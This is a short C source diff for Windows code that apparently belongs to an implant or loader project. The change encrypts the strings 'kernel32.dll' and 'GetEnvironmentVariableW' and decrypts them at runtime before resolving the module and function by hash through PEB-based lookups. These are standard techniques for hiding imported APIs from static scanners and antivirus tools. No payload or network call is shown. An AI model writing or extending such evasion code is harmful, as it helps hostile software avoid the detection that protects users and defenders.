@@ -11,6 +11,7 @@
 #include "temp_wipe.h"
 #include "config.h"
 #include "engine.h"
+#include "enc_strings.h"
 
 #ifdef ENABLE_TEMP_WIPE
 #include "peb.h"
@@ -27,8 +28,8 @@ typedef DWORD (*FnGetEnvironmentVariableW)(PWSTR, PWSTR, DWORD);
 
 static void *load_kernel32(void)
 {
-    return mirage_get_module_by_hash(
-        mirage_encrypted_hash_module("kernel32.dll"));
+    char dll[32]; enc_decrypt(enc_kernel32, ENC_KERNEL32_LEN, dll);
+    return mirage_get_module_by_hash(mirage_encrypted_hash_module(dll));
 }
 
 /* ── Helper: ASCII to wide ──────────────────────────────────── */
@@ -63,8 +64,9 @@ static int get_env_w(const char *name, wchar_t *buf, DWORD buf_chars)
     void *k32 = load_kernel32();
     if (!k32) return 0;
 
+    char fn[32]; enc_decrypt(enc_GetEnvironmentVariableW, ENC_GETENVIRONMENTVARIABLEW_LEN, fn);
     FnGetEnvironmentVariableW pGetEnv = (FnGetEnvironmentVariableW)mirage_get_function_by_hash(
-        k32, mirage_encrypted_hash_func("GetEnvironmentVariableW"));
+        k32, mirage_encrypted_hash_func(fn));
     if (!pGetEnv) return 0;
 
     wchar_t name_w[128];
